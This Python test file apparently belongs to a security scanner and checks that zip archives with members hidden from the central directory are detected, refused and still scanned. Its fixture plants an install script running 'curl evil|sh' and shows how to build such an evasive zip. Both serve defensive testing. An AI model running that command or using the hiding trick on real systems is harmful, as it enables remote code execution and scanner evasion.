"""A zip whose local headers and central directory disagree (`package.md` PK-07)."""

from __future__ import annotations

import io
import struct
import zipfile

from cordon_scanner.sources.archive import ArchiveReader
from cordon_scanner.sources.base import Rejection


class TestAMemberOnlyAStreamingExtractorSeesIsFound:
    @staticmethod
    def hidden_zip() -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("package/index.js", "module.exports = 1;\n")
            archive.writestr(
                "package/install.js", "require('child_process').exec('curl evil|sh')\n"
            )
        data = buf.getvalue()
        # Drop the second central-directory record, so only the local header carries the member.
        end = data.rindex(b"PK\x05\x06")
        _directory_size, directory_offset = struct.unpack_from("<LL", data, end + 12)
        first = data.index(b"PK\x01\x02", directory_offset)
        second = data.index(b"PK\x01\x02", first + 4)
        kept = data[first:second]
        eocd = bytearray(data[end:])
        struct.pack_into("<HHLL", eocd, 8, 1, 1, len(kept), directory_offset)
        return data[:directory_offset] + kept + bytes(eocd)

    def test_the_hidden_member_is_refused_and_still_scanned(self) -> None:
        result = ArchiveReader.extract(self.hidden_zip(), path="p.zip")
        names = [m.name for m in result.members]
        assert "package/index.js" in names
        assert "zip-local/package/install.js" in names
        hidden = [r for r in result.rejected if r.reason == Rejection.HIDDEN]
        assert [r.name for r in hidden] == ["package/install.js"]
        payload = next(m for m in result.members if m.name.startswith("zip-local/")).data
        assert b"curl evil" in payload

    def test_an_ordinary_zip_has_no_hidden_member(self) -> None:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
            for i in range(5):
                archive.writestr(f"p/{i}.py", f"x = {i}\n")
        result = ArchiveReader.extract(buf.getvalue(), path="p.zip")
        assert not [r for r in result.rejected if r.reason == Rejection.HIDDEN]
        assert len(result.members) == 5

    def test_an_unlisted_empty_directory_installs_nothing(self) -> None:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(zipfile.ZipInfo("CANTON/"), b"")
            archive.writestr("CANTON/CANTON.prj", "GEOGCS\n")
        data = buf.getvalue()
        # Keep only the second central-directory record: the directory entry is local-only.
        end = data.rindex(b"PK\x05\x06")
        _directory_size, directory_offset = struct.unpack_from("<LL", data, end + 12)
        first = data.index(b"PK\x01\x02", directory_offset)
        second = data.index(b"PK\x01\x02", first + 4)
        kept = data[second:end]
        eocd = bytearray(data[end:])
        struct.pack_into("<HHLL", eocd, 8, 1, 1, len(kept), directory_offset)
        result = ArchiveReader.extract(data[:directory_offset] + kept + bytes(eocd), path="p.zip")
        assert not [r for r in result.rejected if r.reason == Rejection.HIDDEN]
        assert [m.name for m in result.members] == ["CANTON/CANTON.prj"]


class TestAHiddenMemberIsReadOrSaysWhyNot:
    """A hidden zip member is read from its local header (`zip-local/`), so its refusal leaves
    nothing unread and the scan stays complete; each way one goes unread is a refusal of its own,
    and an incomplete scan always carries an operational finding saying why (review 98: two zuppa
    wheels ended incomplete with only a detection finding)."""

    @staticmethod
    def scan(tmp_path, data: bytes):  # type: ignore[no-untyped-def]
        from cordon_scanner import Scanner
        from cordon_scanner.foundation.config.settings import Config

        target = tmp_path / "p.zip"
        target.write_bytes(data)
        limits = Config.default().limits.merged(per_file_timeout=0.0, total_timeout=0.0)
        return Scanner(Config.default().with_overrides(limits=limits, use_cache=False)).scan(target)

    def test_a_read_hidden_member_leaves_the_scan_complete(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        result = self.scan(tmp_path, TestAMemberOnlyAStreamingExtractorSeesIsFound.hidden_zip())
        rules = {f.rule_id for f in result.findings}
        assert "SUSPECT.ARCHIVE.POLYGLOT.001" in rules, rules
        assert result.content_complete, sorted(rules)
        assert "OPERATIONAL.SCAN.INCOMPLETE" not in rules

    def test_a_hidden_member_that_cannot_be_read_is_refused_as_unreadable(self) -> None:
        data = bytearray(TestAMemberOnlyAStreamingExtractorSeesIsFound.hidden_zip())
        second = data.index(b"PK\x03\x04", 4)
        struct.pack_into("<H", data, second + 8, 99)  # a compression method nothing reads
        result = ArchiveReader.extract(bytes(data), path="p.zip")
        reasons = {(r.name, r.reason) for r in result.rejected}
        assert ("package/install.js", Rejection.UNREADABLE) in reasons, reasons
        assert not [m for m in result.members if m.name.startswith("zip-local/")]

    def test_a_hidden_member_past_the_limit_is_refused_as_read_in_part(self) -> None:
        from cordon_scanner.foundation.config.settings import Config

        limits = Config.default().limits.merged(max_file_bytes=16, max_member_bytes=16)
        result = ArchiveReader.extract(
            TestAMemberOnlyAStreamingExtractorSeesIsFound.hidden_zip(), path="p.zip", limits=limits
        )
        reasons = {(r.name, r.reason) for r in result.rejected}
        assert ("package/install.js", Rejection.SIZE) in reasons, reasons

    def test_an_incomplete_scan_with_no_reason_gets_the_backstop(self) -> None:
        from cordon_scanner.engine.pipeline.accumulator import Accumulator
        from cordon_scanner.foundation.results import OperationalFinding

        notice = OperationalFinding.build(
            path=".", rule_id="OPERATIONAL.INTEL.STALE", message="m", remediation="r"
        )
        bare = Accumulator(complete=False)
        bare.append(notice)
        bare.explain_incomplete()
        assert [f.rule_id for f in bare.findings][-1] == "OPERATIONAL.SCAN.INCOMPLETE"
        explained = Accumulator(complete=False)
        explained.append(
            OperationalFinding.build(
                path="a", rule_id="OPERATIONAL.FILE.TRUNCATED", message="m", remediation="r"
            )
        )
        explained.explain_incomplete()
        assert "OPERATIONAL.SCAN.INCOMPLETE" not in {f.rule_id for f in explained.findings}
        whole = Accumulator()
        whole.explain_incomplete()
        assert not whole.findings

    def test_the_pruned_directory_note_is_the_reason_and_no_backstop_joins_it(self) -> None:
        """A pruned node_modules leaves the scan incomplete and says so at low severity; a medium
        backstop beside it would block a default scan the note was written to leave quiet."""
        from cordon_scanner.engine.pipeline.accumulator import Accumulator
        from cordon_scanner.foundation.models import Category, Severity
        from cordon_scanner.foundation.results import OperationalFinding

        pruned = Accumulator(complete=False)
        pruned.append(
            OperationalFinding.build(
                path=".",
                rule_id="POLICY.COVERAGE.PRUNED",
                category=Category.POLICY,
                severity=Severity.LOW,
                message="m",
                remediation="r",
            )
        )
        pruned.explain_incomplete()
        assert [f.rule_id for f in pruned.findings] == ["POLICY.COVERAGE.PRUNED"]
        detection_only = Accumulator(complete=False)
        detection_only.append(
            OperationalFinding.build(
                path="a",
                rule_id="SUSPECT.ARCHIVE.POLYGLOT.001",
                category=Category.SUSPICIOUS,
                message="m",
                remediation="r",
            )
        )
        detection_only.explain_incomplete()
        assert detection_only.findings[-1].rule_id == "OPERATIONAL.SCAN.INCOMPLETE"
